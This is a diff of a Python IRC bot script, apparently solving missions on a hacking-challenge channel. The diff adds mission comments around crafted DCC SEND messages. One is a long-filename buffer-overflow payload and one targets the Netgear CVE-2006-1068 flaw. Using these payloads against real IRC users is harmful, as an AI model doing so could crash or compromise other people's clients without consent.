@@ -27,12 +27,16 @@ irc.hold_for_response("End of /NAMES list")
 
 irc.send_command("PRIVMSG #htb :!htb")
 time.sleep(3)
+#mission 1
 irc.send_command("PRIVMSG #htb :!say !op unground")
 time.sleep(3)
+#mission 2
 #buffer overflow attack http://www.securityfocus.com/bid/8818/exploit
 irc.send_command('PRIVMSG moo :\001DCC SEND "a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a a" 1344406250 34234 32234234')
 time.sleep(3)
+#mission 4
 #netgear vulnerability CVE-2006-1068 - http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1068
 irc.send_command('PRIVMSG moo :\001DCC SEND "qweasdzxcqweasdzxc" 0 0 0')
+
 while True:
     time.sleep(1)
